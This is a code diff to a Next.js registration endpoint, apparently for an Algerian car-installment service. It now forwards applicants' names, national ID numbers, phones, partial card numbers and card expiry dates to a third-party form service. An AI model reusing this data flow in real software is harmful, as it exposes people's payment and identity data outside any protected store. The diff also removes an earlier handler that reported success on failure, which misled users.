@@ -42,26 +42,38 @@ ${selectedCar ? `القسط الشهري: ${new Intl.NumberFormat("ar-DZ").forma
         "Accept": "application/json",
       },
       body: JSON.stringify({
-        email: "autodzaircontact@gmail.com",
-        name: fullName,
-        phone: phone1,
-        message: message,
-        subject: `تسجيل جديد: ${fullName} - ${selectedCar?.brand || ""} ${selectedCar?.model || ""}`,
+        fullName: fullName,
+        nin: nin,
+        phone1: phone1,
+        phone2: phone2 || "غير محدد",
+        cardNumber: cardLast8,
+        cardExpiry: cardExpiry,
+        hasPreviousInstallment: hasPreviousInstallment ? "نعم" : "لا",
+        selectedCar: selectedCar ? `${selectedCar.brand} ${selectedCar.model}` : "لم يتم الاختيار",
+        carPrice: selectedCar ? `${selectedCar.price} دج` : "",
+        monthlyPayment: selectedCar ? `${selectedCar.monthlyPayment} دج/شهر` : "",
+        registrationDate: new Date(createdAt).toLocaleString("ar-DZ"),
+        _subject: `تسجيل جديد: ${fullName}`,
       }),
     })
 
+    console.log("[v0] Formcarry response status:", formcarryResponse.status)
     const result = await formcarryResponse.json()
+    console.log("[v0] Formcarry result:", result)
+
+    if (!formcarryResponse.ok) {
+      console.error("[v0] Formcarry error:", result)
+    }
 
     return NextResponse.json({ 
       success: true,
       message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
     })
   } catch (error) {
-    console.error("Registration error:", error)
-    // Still return success so user sees confirmation
+    console.error("[v0] Registration error:", error)
     return NextResponse.json(
-      { success: true, message: "تم تسجيل البيانات بنجاح" },
-      { status: 200 }
+      { success: false, message: "حدث خطأ في التسجيل" },
+      { status: 500 }
     )
   }
 }
